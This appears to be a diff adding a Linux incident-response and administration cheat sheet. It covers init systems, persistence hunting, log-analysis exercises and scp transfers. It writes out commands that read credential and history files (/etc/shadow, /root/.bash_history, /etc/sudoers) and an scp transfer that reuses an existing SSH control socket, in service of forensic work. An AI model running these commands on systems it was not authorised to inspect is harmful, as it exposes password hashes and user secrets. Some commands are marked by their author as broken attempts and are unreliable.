+
+cat /etc/logrotate.conf 
+ls -latr /etc/logrotate.d/
+
+# scheduled 2 
+ls -al /etc/cron.d/ 
+
+# users 2 
+	ls -latr /root
+	cat /root/.bash_history
+cat /etc/sudoers
+cat /etc/passwd 
+	cat /etc/passwd | grep -v "nologin"
+cat /etc/shadow 
+	getent passwd # LDAP accounts/auth?	
+cat /etc/group
+	getent group 
+	
+# footprint check
+find / \( -path /proc -prune -o -path /sys -prune \) -o -mmin -<duration since initial connection> -type f -print0 | xargs -0 ls -latr 
+
+}
+
+
+}
+
+
+}
+
+# Init. Methods / Startup scripts  (+ xinetd {
+
+1. SysV { # /etc/inittab, /etc/rc.d/, Runlevels - System Initialization and Management (who -r/runlevl, service, insserv, chkconfig, update-rc.d) 
+
+# view runlevel 
+who -r 
+runlevel # (linux)
+
+# switch runlevel 
+init [level]
+
+# SysV service management 
+service
+	# check service status 
+	service [name] status
+	service ntp status
+	# GRACEFULLY stop service - will run until service is 
+	service ntp stop 
+		# locate services via 
+			1. netstat -punta 
+			2. startup scripts : find /etc/init | egrep -i "ssh|dovecot|echo|python|ltsrv
+			3. find: find /etc/init | egrep -i "ssh|dovecot|echo|python|ltsrv # look in /usr/bin or /usr/sbin for service binary
+			# or may need to do a full / search of name if not there
+		sudo service ssh stop && sudo service dovecot stop && sudo service crazy8 stop && sudo service echo stop && \
+		sudo service srv stop 
+	OR
+		sudo initctl stop ssh
+		sudo initctl stop dovecot
+		sudo initctl stop echo
+
+chkconfig --list
+
+# list number of startup services for runlevel 2 
+ls /etc/rc2.d | egrep "^S.*" | wc -l 
+	insserv -s # The output is in the format of: Start_or_Stop:Start_Order_Number:Enabled_Run_Levels:Service_Name. For instance, ssh service appears as S:17:2 3 4 5:ssh. This means it will start in runlevels 2, 3, 4, and 5.
+
+# determine how many runlevels a service is enabled in?
+ls /etc/rcX.d | egrep "^S.*SERVICE_NAME
+	insserv -s | grep "S.*SERVICE_NAME
+
+# enable a service to start in a different runlevel (e.g. auditd in runlevel 2)
+chkconfig --level 2 auditd on
+	chkconfig --level 2345 telnet on
+update-rc.d auditd enable 2 
+	update-rc.d auditd default 2 
+	
+# disable a service by renaming the runlevel rc to K instead of S 
+cp /etc/rc3.d/S01auditd /etc/rc3.d/K01auditd
+
+# change default runlevel
+vi /etc/inittab 
+-- find id line 
+id [runlevel] initdefault
+
+}
+
+2. Upstart { # (initctl, update-rc.d)
+# find runlevel
+vim /etc/rc-sysinit.conf
+	/etc/inittab # for linux and CentOS Upstarts 
+	who -r 
+	runlevel 
+
+# find startup scripts for runlevel - same structure as SysV 
+ls -l /etc/rc2.d/S*
+
+# switch runlevel 
+telinit 3
+
+# start service 
+initctl start apache2
+	service apache2 start # for SysV service
+
+# show currently running upstart managed services 
+initctl list 
+
+# show stop/start conditions for all services 
+initctl show-config
+
+# examine upstart services more in-depth // what conditions will cron service start?
+initctl show-config cron 
+vim /etc/init/cron.conf  # or view by  
+
+
+}
+
+3. Systemd { # (systemctl )
+
+# list all unit files and statuses
+systemctl list-unit-files 
+systemctl list-units --all 
+
+# list ACTIVE units and SUBACTIVE state units / attempted to load into memory 
+systemctl list-units
+
+# list only enabled units 
+systemctl list-unit-files --type=service --state=enabled
+	systemctl list-unit-files -t service | grep enabled | wc -l # num enabled on boot
+
+# is specifc unit enabled?
+	systemctl status UNIT_NAME
+	systemctl is-enabled UNIT_NAME
+
+# what units have been modified on a system?
+systemd-delta 
+
+# view unit's dependencies 
+systemctl list-dependencies [unit] --no-pager 
+	systemctl list-dependencies sshd --no-pager 
+
+# view units -depedent- on the unit 
+systemctl list-dependencies [unit] --reverse 
+
+# determine the systemd default startup file 
+systemctl get-default
+	ls -l /etc/systemd/system/default.target # what target is symlinked 
+
+# !!! view the CURRENT target 
+journalctl # find current message date and review OR 
+	journalctl --list-units 
+journalctl -b --no-pager | grep "Reached target"
+
+# change default target 
+systemctl set-default multi-user.target 
+
+# check if target is ACTIVE 
+systemctl is-active graphical.target
+
+# immediately change target 
+systemctl isolate multi-user.target
+
+{ # Configure systemd unit 
+1. create [unit_name].service in /usr/lib/systemd/system 
+
+2. at minimum, include 
+
+[Service]
+ExecStart=/path/to/file   
+
+[Install]
+WantedBy=multi-user.target   
+	# create symbolic link in /etc/systemd/system/multi-user.target.wants dir 
+	
+3. run
+	systemctl daemon-reload
+	systemctl enable my.service 
+
+} 
+
+}
+
+4. SMF { # - Service Management Facility / SOLARIS 
+
+# view runlevel 
+who -r 
+
+# manage SMF svcs
+svcadm 
+svcs 
+
+# get service status 
+svcs -l <name> 
+
+# list all avail. services
+svcs -a 
+
+# start/stop/restart service  -t == temporary 
+svcadm enable|disable -t <name>
+svcadm restart <name>
+
+# enable/disable service 
+svcadm enable|disable <name>
+	svcadm disable svc:/system/cron # alternate
+
+# get current milestone 
+svcs milestone*
+
+# set default milestone 
+svcadm milestone -d <milestone>
+
+# get default milestone 
+svcpropc svc:/system/svc/restarter:default/:properties/options/milestone
+	#If svcprop returns a message that the argument ‘doesn’t match any entities’, it means that the default milestone has not been set manually. In this case, the default milestone is multi-user-server
+
+# determine services are configured on boot 
+svcs -a | egrep ‘online|legacy_run.*rc[0123S]_d’
+
+# view online services 
+svcs | grep online 
+
+# manage  inet services (anything net related e.g. telnet, ssh, web)
+inetadm  # will view all inetd services 
+
+# examine files/ports inetd has opened 
+pfiles -F <pid_of_inted> | less
+	/etc/services 
+
+}
+
+5. xinetd check { 
+
+1. # check xinetd services - this works on RHEL/CentOS/Fedora 
+	chkconfig --list
+2. # check startup scripts 
+	ls -latr /etc/init.d/ 
+3. # check sus service
+	less /etc/init.d/[service]
+4. # check xinetd service conf. 
+	vim /etc/xinet.d/[service]
+
+}
+
+6. systemd-cgls { # control group contents - check user/proc slices for persistence
+***check user slice, cron slice etc. 
+systemd-clg
+
+}
+
+
+}
+
+# MISC (DNS, timezone, tar, +)  {
+# confirm DNS servers 
+nslookup <name> <DNS-server>
+
+dig @<DNS-server> name.com 
+	A record should return an IP for it to work!
+
+# change systemtime to UTC 
+ls -al /etc/localtime # check its link 
+ln -sf /usr/share/zoneinfo/UTC /etc/localtime # change to UTC 
+	timedatectl set-timezone UTC # systemd method 
+
+# look for mal user attempts 
+grep "Failed password" /var/log/secure |cut -d ":" -f 4 |grep -v "invalid user" |awk '{print $6}' |sort -n |uniq 
+
+# time converter 
+date -d @<epoch-time>  # convert epoch to human read
+date +%s # get current time in epoch 
+
+# sudoers breakdown
+%admin ALL=(ALL) ALL
+	in admin group, from ALL hosts, ALL users (and their default primary group), can sudo ALL commands 
+%sudo ALL=(ALL:ALL) ALL
+	in sudo group, from ALL hosts, ALL users and all groups, can sudo ALL commands 
+
+# ipv4 forward enabled?
+cat /proc/sys/net/ipv4/ip_forward
+ 
+{ # tar [options] [dest.tar] [target]
+
+# backup /var/run INCLUDING dirs. when extracting, will create /var and /run dir and all files in run 
+tar -cvf /tmp/backup/run.tar /var/run 
+
+# backup /var/run, ONLY files (just need to be in the actual dir). when extracting, will only provide files 
+tar -cvf /tmp/backup/run1.tar -C /var/run .
+	- change dir to /var/run then create tarball
+	
+# extract 17th file from .tar 
+tar -xvf run.tar `tar -tf run1.tar | head -n18 | tail -n1 | sed 's|^./||` # < busted attempt, pretty close + extra
+tar -xf run1.tar `tar -tf run1.tar | head -n 17 | tail -n 1
+
+}
+
+# check num of virtual webhosts 
+apache2ctl -t -D DUMP_VHOSTS
+ls -al /etc/apache2/sites-enabled/
+
+
+}
+
+# FINDS {	 
+# log search 
+grep -R --exclude-dir=/path/to/dir  "search string" /
+
+# find modified files since -X time // good for writing/logging - sus procs & services 
+sudo find / \( -path /proc -prune -o -path /sys -prune \) -o -mmin -<since mod> -type f -print0 | xargs -0 sudo ls -latr 
+
+# search for files across multiple paths i.e. $PATH variable 
+find $(echo $PATH | tr ':' ' ') -type f -newerct "2018-10-26 14:44:00" ! -newerct "2018-10-26 14:45:00"
+
+# find hidden files and dirs 
+find / -type f -name ".*"
+find / -type d -name ".*"
+
+# (persistence) search using (malware) timestamps 
+find / -newermt "2018-01-18" ! -newermt "2018-01-19"
+find / -newermt "2018-01-18 05:15:00" ! -newermt "2018-01-18 05:25:59"
+
+{ # EXAMPLES - // show alternate (fb) methods 
+
+#2. find all files w/ extension .png in /root/Corvus and subdirs 
+find /root/Corvus -type f -name "*.png"
+
+#3. how many are .png actually?
+for i in `find /root/Corvus -type f -name "*.png"`; do file $i; done | grep PNG 
+	//find /root/Corvus -name "*.png" -exec file {} \;.
+	
+#5. find files between 2 timestamp of file1 and file 2
+stat [file1] [file2]
+find / -newermt "2016-08-14 22:53:04"  ! -newermt "2016-08-24 22:53:04"
+	- newermt # -newerXY == timestamp reference
+				a = access time
+				B = birth time
+				c = inode status change time 
+				m = moidifcation time 
+				t = reference interpreted directly as time 
+	// find / -type f -newermt "YYYY-MM-DD" ! -newermt "YYYY-MM-DD"
+	// find / -type f -newer /root/file1 ! -newer /root/file2
+
+#6. find by access time
+find / -newerat "2016-08-14 22:53:04"  ! -newerat "2016-08-24 22:53:04"
+
+	// find / -type f -newerat "YYYY-MM-DD" ! -newerat "YYYY-MM-DD"
+	// find / -type f -anewer /root/file1 ! -anewer /root/file2.
+
+#7. find files older than 30 days and delete them 
+for i in $(find /root/metrics -type f -mtime +30); do rm -f $i; done  
+	// find / -type f -newerat "YYYY-MM-DD" ! -newerat "YYYY-MM-DD"
+	// find / -type f -anewer /root/file1 ! -anewer /root/file2.
+
+#8. find files in /root/metrics older than 30 days and delete them
+for i in $(find /root/metrics -type f -mtime +30); do rm -f $i; done  
+	// find /root/metrics -mtime +30 -exec rm {} \;
+	
+#12. Identify the number of unique IP addresses in the HTTP log /var/log/access_log that requested the page /child.
+grep "/child " /var/log/access_log | cut -d " " -f1 | sort -u # added space - some request have childd
+	// grep "/child " /var/log/access_log | awk {'print $1'} | sort | uniq
+
+#16. Using the file /var/log/access_log, identify the IP address that uses multiple useragent strings.
+for i in $(awk {'print $1'} /var/log/access_log | sort | uniq); do echo $i && grep $i /var/log/access_log | awk -F\" {'print $5'}; done
+	
+#20. Using only the file /var/log/iptables.log, identify the IP address that is potentially using MAC address spoofing. What command(s) did you use? How many MAC addresses and which MAC addresses has the IP address used?
+for i in `grep "SSH Port: IN" /var/log/iptables.log | awk '{print $12}' | sort -u`; do grep $i /var/log/iptables.log | awk '{print $11}' | sort -u | wc -l; echo $i; done
+
+// for i in $(awk {'print $12'} /var/log/iptables.log | sort | uniq); do echo $i && grep $i /var/log/iptables.log | cut -d' ' -f11 | sort | uniq; done
+
+#X. Symbolic Link full path finder 
+cask=$(find / -type l 2>/dev/null -exec ls -la {} \; | grep [just file ex. file1] | awk {'print $9'} | sort); for i in $cask; do echo -e "$(readlink -f $i) \t $i"; done
+}
+
+}
+
+# TRANSFER  {
+
+{ # With slaves  
+#file 
+scp -o ControlPath=/tmp/t1.ssh <user>@127.1:/target/file /local/path 
+
+#directory 
+scp -r -o ControlPath=/tmp/t1.ssh -r <user>@127.1:/target/dir /local/path 
+}
+
+{# No slaves 
+#file 
+scp <remote_user>@<remote_IP>:/remote/file /local/path 
+
+#directory 
+scp -r <remote_user>@<remote_IP>:/remote/dir/path /local/path 
+}
+
+}
+
+=========================================================================================================================
+}
+
+}
+
